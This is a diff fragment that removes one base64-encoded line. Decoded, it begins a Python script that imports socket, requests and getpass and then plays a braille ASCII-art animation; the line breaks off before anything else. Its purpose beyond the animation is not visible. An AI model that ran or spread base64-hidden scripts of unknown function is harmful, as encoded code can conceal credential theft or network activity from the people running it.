@@ -1,1 +1,240 @@
-aW1wb3J0IHNvY2tldAppbXBvcnQgb3MKaW1wb3J0IHJlcXVlc3RzCmltcG9ydCByYW5kb20KaW1wb3J0IGdldHBhc3MKaW1wb3J0IHRpbWUKaW1wb3J0IHN5cwoKZGVmIGFzY2lpX3ZybygpOgogICAgY2xlYXIoKQogICAgcHJpbnQoZicnJwogICAgIOKitOKjpOKjtuKjvuKjn+Kjh+KggOKgkOKgkuKgguKgv+Kgm+Kiu+Kgs+KhluKgkOKghuKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKhgOKggOKggOKggOKgieKgs+KgpOKjgOKjgOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggArioIDioIDioIjioInioInioJvioJPioLLioKbio6Tio4Tio4DioYDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDio6DioJ7ioIHioIDio6DioLTioILioIDioIDioIDioInioJnioLLio4TioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIAK4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCJ4qCJ4qCJ4qCT4qCS4qC24qOk4qOE4qGA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qKA4qG24qCB4qCA4qKg4qCe4qCB4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qGA4qCA4qOA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCACuKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKgiOKgieKgk+KgtuKipOKjgOKggOKggOKggOKgiOKgk+KipuKggOKgmOKiu+KggOKggOKioOKhh+KggOKghuKggOKgpOKjpOKhgOKgpOKipOKgpOKgluKgmuKgieKggOKggOKgiOKis+KhgOKggOKggOKggOKjgOKhpOKggOKggOKggOKggOKggArioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIjioJnioKbio4Tio6TioaTio7bio7fio4Tio7jio6bioIDiorjioIDio4DioaTio77io7/io7bio77io6fioITioIDioIDiooDio4DioaTior7ioYHioIDioInio7vioJfioIvioIHioIDioIDioIDioIDioIDioIAK4qC24qOE4qOA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCY4qOH4qO44qOP4qCB4qCI4qCb4qK74qOv4qO/4qO+4qCf4qKB4qCA4qO/4qO/4qGP4qCf4qCb4qCL4qCJ4qCB4qCA4qCA4qKI4qO74qG24qCa4qCB4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCACuKjpOKjhOKjmeKju+KjpuKjhOKhgOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKjoOKglOKggOKggOKgueKjn+KjmuKju+KipuKjhOKggOKggOKgieKgm+KgguKggOKgkeKgmeKgi+KggOKggOKggOKggOKgkOKgpuKgluKju+Kht+Kgi+KggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggArioL/ioL/ioLvioL/ioL/ioL/ioL/ioLfio6bio4Tio4DioIDioIDioIDioIDioIDioIDioIDioIDioIDiooDio6DioLTioJ7ioIHioIDioIDioIDioIDio7/ioL/ioLfioLbior/io7DioILiooDiobbio4TioJDioILioIDiorvio4biooDio7Tio5Lio7bio7bioLTioIvioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIAK4qC24qK24qO24qOk4qOk4qO04qO24qO24qCZ4qCJ4qC74qC/4qK24qO24qG24qCW4qCS4qCS4qCS4qCa4qCJ4qCB4qCA4qCA4qCA4qCA4qCA4qCA4qO84qCD4qCA4qCA4qCA4qCA4qCJ4qKh4qGf4qCA4qO94qCW4qCS4qCA4qCJ4qCJ4qCb4qKm4qG04qCb4qCB4qCA4qCA4qC44qOE4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCACuKjtuKjpuKjrOKjreKjveKhm+Kgm+Kgu+Kjv+Kjr+Kjp+KjtOKgn+KggeKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKhvOKgieKggOKggOKggOKggOKggOKggOKhnuKigOKhnuKggeKggOKggOKggOKigOKhpOKgluKgieKggOKggOKggOKggOKggOKggOKgmeKgs+KipOKjhOKhgOKggOKggOKggOKggOKigOKjoOKjpOKjvgrioJvioL/io7/io7/io7/io7/io7/io7/io7/iob/ioIvioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioqfioIDio4Dio6TioqTio5bio5Lio7Lio7fio7/io5LioLLioqTiobTioJrioIHioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioJjioqniob3ioJvio7/io7/io7/io7/io7/ioJkK4qGA4qCA4qCJ4qK/4qOt4qO/4qO/4qG/4qCL4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qKg4qCf4qCL4qCJ4qCJ4qCA4qCA4qCA4qCA4qCA4qCA4qOg4qCf4qCB4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qK44qGf4qCB4qCA4qCA4qCACuKjv+KjtuKjpuKjpOKjv+Khv+Kgi+KggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKjoOKjv+KjgOKjgOKggOKjgOKjgOKjgOKggOKggOKjoOKgnuKggeKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKiuOKhj+KgieKgieKgieKgiQrio7/io7/io7/io7/ioZ/ioIHioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDiobDioJrioIHioIDio6DioJ7ioIvioIHioIDioIjiornioJ7ioIHioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDiorjio7fioYTioIDioIDioIAK4qO/4qO/4qO/4qCP4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qKg4qG+4qCB4qCA4qCA4qG84qCB4qCA4qCA4qCA4qCA4qO04qCD4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qK44qO/4qO/4qOA4qCA4qCACuKjv+Kjv+Khn+KggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKiuOKgg+KggOKggOKjuOKggeKggOKggOKggOKggOKjsOKgo+KggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKgmOKjv+Kjv+Kjv+Khv+Kggwrio7/ioZ/ioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDiorjioIDioIDiooDio6/ioIDioIDioIDioIDio7TioIPioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDio7/ior/iobvio7fio6YK4qO/4qGH4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qK44qGE4qCA4qO+4qGH4qCA4qCA4qKA4qG+4qCB4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qO/4qCc4qK34qGZ4qO/CuKjv+KggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKit+KhgOKjv+Kjr+KjgOKhtOKgn+KggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKjv+KhgOKgiOKit+KgiArio7/ioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIjioJ/ioLLior7ioI/ioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDio7/ioYfioIDioIDioIAK4qO/4qGE4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qOG4qCA4qG+4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qO/4qGE4qCA4qCA4qCACuKjv+Khh+KggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKiuOKjv+KggeKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKhv+KggeKggOKggOKggArio7/io7/ioYbioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDiooDior/ioIPioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioqDiob/ioIDioIDioIDioIAK4qO/4qO/4qO/4qOE4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCI4qGP4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qO44qGH4qCA4qCA4qCA4qCACuKjv+Kjv+Kjv+Kjv+KjpuKhgOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKhh+KggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKisOKhn+KggOKggOKggOKggOKggArio7/io7/io7/ioJ/ioJniorfioYTioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDio6fioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioqDiob/ioIPioIDioIDioIDioIDioIAK4qCb4qCJ4qCA4qCA4qOA4qOk4qG/4qOm4qOE4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qK74qGE4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qKg4qO+4qCB4qCA4qCA4qCA4qCA4qCA4qCACuKggOKjgOKhtOKgnuKgieKggOKggOKgiOKjmeKht+KjpuKjgOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKgiOKiv+KhhOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKigOKjtOKjv+KggeKggOKggOKggOKggOKggOKggOKggArioIjioIHioIDioIDioIDioIDioIDioIDioIDioLjioYTio7nio7/io7bio6Tio6Tio4Tio4Dio4Dio4Dio4Dio4Dio4Dio4Dioojiorvio6bioYDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioYDio7rio77io7/iob/ioIDioIDioIDioIDioIDioIDioIDioIAK4qCA4qCA4qCA4qCA4qCA4qCA4qKA4qOg4qGk4qC24qCf4qCb4qCL4qCB4qCA4qCA4qCA4qCI4qOJ4qO94qC/4qCb4qCJ4qOp4qO/4qK/4qO/4qO/4qO34qOk4qGA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qKA4qOg4qOk4qO/4qO/4qO/4qCP4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCACuKggOKjgOKggOKgpOKgnuKgm+KgieKggOKggOKggOKggOKggOKggOKggOKggOKjgOKjtOKgn+Kgi+KggOKjoOKhtOKgn+Kgi+KggOKggOKgiOKji+Kjv+Kjv+Kjv+KjpuKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKigOKjgOKjoOKjtOKjvuKjv+Kjv+Kjv+Kjv+Kgh+KggOKggOKggOKggOKggOKggOKggOKggOKggOKggAriopvioYnio4DioYDiooDioYDioIDioIDioIDioIDioIDioIDio6DiobbioJ7ioIvio4Dio6DioLbioJ/ioIvioIDioIDioIDioIDioqDio7bio7/io7/io7/io7/io7/io7/io7bio7bio7bio6Tio6Tio6Tio6Tio6Tio6Tio7Tio7bio7bio7/io7/io7/io7/io7/io7/io7/io7/iob/ioJLioIDioIDioIDioIDioIDioIDioIDioIDioIDioIAKCgoKCgoKCiAgICAnJycpCiAgICB0aW1lLnNsZWVwKDAuNikKICAgIGNsZWFyKCkKICAgIHByaW50KGYnJycKCgoKICAgIOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKgoOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKgkuKgguKggOKgpOKhgOKggOKggOKggArioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDio7fiooLio6Tio7TioJbioInioInioLLio7bio6TioIDioIDiooDioJDioIDioIDioIDioIAK4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qOi4qGk4qKH4qO+4qOP4qO/4qCA4qKg4qCA4qCE4qO/4qO/4qO/4qGE4qCY4qCD4qCA4qCG4qCA4qCACuKggOKggOKggOKggOKggOKggOKgkOKioeKjgOKgieKggOKgmuKjv+Kjv+Kjv+KjtOKjv+KiuOKjv+Kjv+Kjv+Khv+KggOKgluKggOKhlOKggOKggOKggArioIDioIDioIDioIDioIDioIDioIDioJjioI/ioIDioIDio6jioIPio7/io7/io7/io7/io77io7nio7/io7/ioIPio4Tio7TioZ7ioJHioYTioIDioIAK4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qOI4qOs4qOk4qO04qO24qO+4qO/4qO/4qOv4qO94qO/4qO/4qO34qOn4qGO4qCI4qO/4qCQ4qCQ4qCH4qK04qCWCuKggOKggOKggOKggOKigOKgtOKgi+KggeKggOKggOKggOKgiOKimeKgieKhueKgi+KgieKggOKggOKgieKgmeKgu+KjpuKhg+KgkuKjsuKigOKgv+KghArioIDioIDiooDioJTioIHioIDioIDioIDioIDioIDioIDioIDioYDioqDioIHioIDioIDioIDioIDioIDioIDioIDioIjioLvio6bio77ioIDioIDioIAK4qCA4qCg4qCC4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qKg4qCB4qCY4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCY4qK/4qCA4qCA4qCACuKggOKggeKggOKggOKggOKggOKggOKggOKggOKggOKggOKhgOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKgiOKghuKggOKggArioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIPioqbiorDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDiorDioIDioIAK4qGA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCw4qGA4qCA4qCI4qGE4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCACuKggeKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKgueKjtuKhvuKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKhmOKggOKggArioIDioIHioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioqPioYfioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioZTioIHioIDioIAK4qCA4qCI4qKE4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qOu4qKD4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCw4qCA4qCA4qCA4qCACuKggOKggOKgiOKjt+KjpuKjgOKjgOKjgOKggOKjgOKjoOKjvuKjv+Kjv+KjhuKggOKggOKggOKggOKggOKggOKggOKggOKjsOKgg+KggOKggOKggOKggArioIDioIDioIDioJjior/io7/io7/io7/iob3ior/io7/io7/ioZ/ioLnio7/io7fio6bio6Tio6Tio6Tio6Tio7bio7/ioI/ioIDioIDioIDioIDioIAK4qCA4qCA4qCA4qCA4qKg4qO94qO/4qO/4qK/4qGf4qO/4qGf4qCh4qOE4qO94qOJ4qO74qO/4qOf4qOf4qKf4qG/4qGt4qOk4qCA4qCA4qCA4qCA4qCACgoKICAgICcnJykKICAgIHRpbWUuc2xlZXAoMC42KQogICAgY2xlYXIoKQogICAgcHJpbnQoZicnJwoKCgoKCgoKICAgICDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDiooDiobzioJvioJvioJniorbiobvior/iobbio6TioYDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDio6DiobTioJLio4bioIDioIDioIAK4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qKA4qGf4qCA4qCA4qOA4qOA4qOI4qOZ4qOG4qCZ4qKm4qCZ4qKm4qGA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qKA4qOg4qG04qCe4qCB4qCA4qCA4qCY4qOm4qCA4qCACuKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKigOKjv+KjoOKgtuKgi+KiieKjieKggOKggOKgieKggeKgiOKis+KhgOKgmeKipuKjgOKjgOKjgOKjoOKgpOKjpOKjpOKjpOKggOKigOKjgOKjgOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKigOKjoOKjtuKhvuKjv+Kjn+KjpOKhtuKghuKggOKggOKggOKgmOKjhuKggArioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDio7zioJ/ioIHioqDio77ioK3ioIDioIDioIDioIDio6DioaTioKTio7fioYDioIDioIDioqDio7Tio7TioJrioInioIDioIDioIDioIDioIDioIjioInioJvioJvioLLio6Tio4DioIDio6DiobTioJvio6nioJ/ioKnioJ7ioInioqDioI/ioIDioIDioIDioIDioIDioIDiorvioYAK4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qO44qGP4qCA4qO04qOL4qOA4qOA4qKA4qGg4qCW4qCJ4qCB4qCA4qCA4qCA4qOp4qGA4qOg4qCf4qCH4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qKA4qOg4qCJ4qCp4qKh4qOg4qCe4qCB4qCA4qCA4qCA4qCA4qCJ4qCJ4qCJ4qKJ4qO34qCG4qCA4qCA4qCA4qGHCuKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKigOKjr+Khh+KgkOKgi+KiseKgj+KgtOKjq+KghOKggOKggOKggOKggOKjoOKgnuKigeKjvOKhveKggeKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKjoOKgnuKgieKhgeKggOKggOKggOKgu+KjhOKigOKggOKggOKggOKggOKggOKisOKjvuKhieKggOKggOKggOKggOKggOKiswrioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDiorjiorvioIDio6DioJ7ioIHio6DioJ7ioIHioIDioIDioaTioIDiobzioIPioqDio77ioLvioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDiooDiob7ioIHioIDiobTioIHioIDioIDioIDioIDioJjioK/ioqbioYDioIDioIDioIDioIjioLvio73ioIDioIDioIDioIDioIDiorgK4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qGO4qOv4qG+4qCB4qKA4qG84qCB4qCA4qCA4qCA4qGc4qCB4qG44qCD4qOg4qCf4qGH4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qGw4qCL4qCA4qKA4qO+4qCB4qOw4qCA4qCA4qCA4qCA4qC44qGG4qCI4qC/4qKm4qGA4qCA4qCA4qKA4qG54qGE4qCA4qCA4qCA4qCA4qK4CuKggOKggOKggOKggOKggOKggOKggOKggOKggOKigOKjv+Kii+KhhOKigOKgn+KigOKhnuKggOKggOKjuOKggeKggOKgg+KioOKgi+KigOKhh+KggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKigOKgnuKiueKggOKiu+KggOKggOKggOKggOKggOKjueKhgOKggOKgiOKis+KhgOKis+KhgOKjv+Kgg+KggOKggOKggOKggOKhuArioIDioIDioIDioIDioIDioIDioIDioIDio7DioJ/ioKHioo/io7TioI/ioqDioY7ioIDioIDio7DioYfioIDioIDiorDioIfioITiorjioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDiooDio7TioJ/ioIDiorjioIDiob7ioIDioIDioIDioYDioIDioqHio7fioIDioIDioIDioLnioIzioLHio6/ioIDioIDioIDioIDioIDioYcK4qCA4qCA4qCA4qCA4qCA4qCA4qKA4qGe4qCB4qO04qG14qK/4qGP4qCA4qG+4qCA4qCA4qOg4qK74qGH4qCA4qKg4qCP4qCg4qCA4qK44qOA4qO04qOk4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qOE4qOk4qO+4qCL4qCA4qCA4qC44qGE4qO/4qGG4qCA4qCA4qK74qCA4qCY4qOf4qGH4qCA4qCA4qCA4qCA4qCA4qKo4qO34qCA4qCA4qCA4qCA4qCRCuKggOKggOKggOKggOKigOKjtOKii+KigOKjvOKgn+KggOKhvOKggeKjuOKgg+KggOKjsOKgg+KiuOKhh+KisOKhn+KigOKjgOKjpOKituKhj+KggOKggOKggOKggOKggOKggOKggOKggOKggOKigOKhv+KgieKgieKgk+KipuKjhOKjp+Kjv+Kjp+KggOKggOKgmOKhh+KggOKiueKjt+KggOKggOKggOKggOKggOKggOKit+Kip+KhgOKggOKggOKhgArioIDioIDioIDiooDio77io7/ioovio7zioI/ioIDiorjioIfioIDioZ/ioIDiorDioIfioJLio7jio6fior7ioJfioJvioInioIHioIDiorPioYDioIDioIDioIDioIDioIDioIDiorjiooPioZ/ioIDioIDioIDioIDioIDioIjior/io7ziorjioYbioIDioIDiorvioIDioLjio7/ioYfioIDioIDioIDioIDioIDioLjioY7ioqPioIDioIDioIEK4qCA4qCA4qOw4qO/4qG+4qCA4qO84qGH4qCA4qCA4qGe4qKA4qO+4qCD4qKg4qGP4qCQ4qCL4qCA4qCZ4qC+4qKm4qCA4qCk4qCk4qCk4qOM4qOn4qGA4qCA4qCA4qCA4qCA4qKg4qO+4qO+4qCA4qCA4qCA4qOA4qOA4qGA4qCA4qCY4qOv4qGH4qK/4qOE4qCA4qK44qGG4qCA4qGP4qGH4qCA4qCA4qCA4qCA4qCA4qCA4qGH4qCA4qCA4qCB4qCACuKggOKjtOKjveKhv+KggeKjuOKiueKggOKggOKggOKjv+KhvOKgieKhh+KhuOKggeKggOKggOKggOKggOKggOKggOKggOKjgOKggOKjgOKjgOKhmOKjt+KjhOKggOKggOKggOKhnuKjt+Khj+KggOKggOKgiuKgieKgiOKgieKggeKggOKiu+Kjp+KgiOKjp+KggOKiuOKhh+KggOKiueKhh+KggOKggOKggOKggOKggOKggOKgh+KggOKggOKgiOKggArio7ziob/io73ioIPioIDioLvio7zioIDioIDioIDior/ioYfioqDiorfioYfioIDioIDiooDio6Tio6Tio4Dio6Tio6Tio6TioaTioqTio4TioYDioIjioInioKPio4Tio7DioYfio7/ioIHioIDioJLioJLioKTio6Tio4DioYDioIDioIDiorvioYbioJjio4bioIjioYfioIDiorjioYfioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIAK4qGf4qOw4qGf4qCA4qCA4qKA4qGP4qCA4qCA4qCA4qCI4qCR4qG84qOA4qOZ4qO24qO24qO/4qOb4qGJ4qOJ4qOJ4qKJ4qCJ4qOZ4qG/4qCf4qCA4qCA4qCA4qCA4qCA4qCJ4qKJ4qGp4qCE4qCA4qOk4qO24qG24qC/4qO24qO+4qO94qOE4qGA4qKz4qGA4qK54qKw4qGH4qCA4qK44qCH4qCA4qCA4qGE4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qGECuKioOKhn+KggOKggOKggOKjvOKggOKggOKggOKggOKggOKioOKhh+Kiv+Kjv+Khi+KgueKjheKggOKhmeKim+Kgm+KjgeKgpOKinuKhheKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKisOKjjOKgk+KipuKhgOKggOKggOKjmeKju+Kjt+Kjv+KjvuKhn+KiuOKggOKhnOKggOKggOKjoOKgg+KggOKggOKggOKhhuKggOKggOKggOKggwriobjioIDioIDioIDiooDioY/ioIDioIDioIDiooDioIfio7jioYfioIDioIjiorvioLrio7vioLfioJ/ioInioInioonio6nioJ/io4nioYDiooDio4DioITioYDioIDioIDioIDioIDioIDioIDioInioInioJnioJLioL/ioq/io4HioYDio5jiobfioJ/ioLvio6fio7zioYDioIDioIDiooDioZ/ioIDioIDioIDiooDioIDioIDioIDioIDioIAK4qCA4qCA4qCA4qCA4qK44qCB4qCA4qCA4qCA4qO+4qKA4qO/4qCD4qCA4qCA4qCA4qCJ4qKB4qOE4qOk4qCk4qCS4qCf4qCS4qCJ4qCJ4qCB4qCA4qCA4qCJ4qCA4qCA4qCA4qCA4qCI4qCA4qCC4qCA4qCA4qCA4qCA4qCA4qCA4qCI4qCn4qOt4qGE4qCQ4qCa4qCb4qKr4qCH4qCA4qKA4qG84qCA4qCA4qCA4qCA4qGG4qCA4qCA4qCA4qCA4qCACuKggOKggOKggOKggOKhvuKggOKggOKggOKjuOKgg+KjuOKjv+KgguKggOKggOKggOKgiOKggeKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKioOKhn+KggOKggOKhvOKggeKggOKggOKggOKioOKhh+KggOKggOKggOKggOKggwrioIDioIDioIDiorDioYfioIDioIDioIDio7/ioqDioZ/ioY7ioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDiooDiob7ioIHioIDiobzioIHioIDioIDioIDiooDio77io4TioIDioIDioIDioIDioIAK4qCA4qCA4qCA4qO/4qCH4qCA4qCA4qCA4qOn4qO/4qKz4qGH4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qOA4qG04qCS4qCb4qCb4qCT4qCi4qOk4qGA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qO84qCD4qCA4qG+4qCB4qCA4qCA4qGA4qCA4qO84qKe4qOv4qGG4qCA4qCA4qCA4qCACuKggOKggOKjuOKjueKggOKggOKggOKiuOKjv+Kjr+KggOKhh+KggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKioOKhvuKgj+KggOKjt+KjtuKjtuKjtuKjtuKjpOKjieKgs+KjhOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKjtOKgg+KigOKhvuKggOKggOKggOKjsOKggOKisOKgh+KgiOKgm+Khh+KggOKggOKggOKggArioIDiooDio7/ioZ/ioIDioIDiooDiorjio7/io6/io6fio6fioIDioIDioIDioILioIDioIDioIDioIDioIDioIDioIjio7/io6Tio4Dio7nio7/io7/io7/io7/io7/io7/io7fio6/io7HioIDioIDioIDioIDioIDioIDioIDioIDioIDiooDiobzioIHio7DioI/ioIDioIDioIDio7DioIPiooDiob/ioIrioIHioqDioIfioIDiooDioIDioIAK4qCA4qO44qGf4qGH4qGE4qCA4qO+4qK74qG74qO/4qGH4qG54qOG